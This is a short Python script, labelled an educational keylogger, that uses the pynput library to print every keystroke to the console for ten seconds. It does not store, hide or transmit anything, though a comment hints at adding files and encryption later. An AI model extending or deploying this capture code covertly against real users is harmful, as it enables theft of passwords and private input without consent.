#This is a simple keylogger implementation in Python using the pynput library.
#It captures keystrokes for a specified duration and prints them to the console. 
#Note that this code is for educational purposes only and should not be used for malicious activities.
from pynput import keyboard

def on_press(key):
    # Just print what we catch — no files, no encryption yet
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        # Special keys (space, enter, shift...) have no .char
        print(f"Special key: {key}")

print("Logging for 10 seconds... type something!")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join(timeout=10)  # auto-stops after 10 seconds

print("Done capturing.")